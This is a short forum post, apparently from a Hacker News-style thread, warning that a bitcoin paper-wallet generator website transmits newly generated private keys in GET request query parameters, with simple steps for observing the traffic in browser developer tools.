So far I haven&#x27;t received an answer. Given that bitcoin reached new all-time heights and that its not long until Christmas I feel like its urgent to do something about this. That&#x27;s why I post it here. Maybe some of you have ideas on how to proceed?<p>Steps to reproduce:\n- open https:&#x2F;&#x2F;bitcoinwalletpaper.com\n- click the &quot;Next&quot; or &quot;Skip&quot; button or complete the secure random number generation\n- open the browsers developer tools (or sniff the network traffic in any other way) and watch the requests start after ~10 seconds<p>=&gt; each request sends the private key of the bitcoin wallet as part of the query param of the GET request')
